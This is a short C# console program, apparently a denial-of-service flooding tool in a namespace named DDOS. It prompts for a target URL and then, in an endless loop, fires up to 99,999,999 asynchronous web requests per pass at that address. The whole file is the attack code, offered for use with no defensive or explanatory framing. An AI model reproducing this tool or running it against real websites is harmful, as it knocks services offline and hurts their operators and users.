using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DDOS
{
    class Program
    {
        private static string url;
        public string Url {
        get { return url; }
        set { url = value;  }
        }
        static void Main(string[] args)
        {
            url = "http://localhost";
            Console.WriteLine("Current url is " + url + ". Do you want to change y/n");
            string change = Console.ReadLine();
            if(change == "y" || change == "Y")
            {
              Console.WriteLine("Enter url to DDOS ");
                url = Console.ReadLine();
            }
            try
            {
                HERE:
                for (int i = 0; i < 100; i++) {
                    i = 0;

                for (Int64 j = 0; j < 99999999; j++)
                    {
                        var client = new WebClient();
                        client.DownloadStringAsync(new Uri(url));
                        client.Dispose();
                        Console.WriteLine(i.ToString());
                    }
                    Thread.Sleep(1000);
                }
                goto HERE;
            }
            catch (InsufficientMemoryException iex)
            {
                Console.WriteLine(iex.Message);
                Console.WriteLine(iex.StackTrace);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
          
    }
}
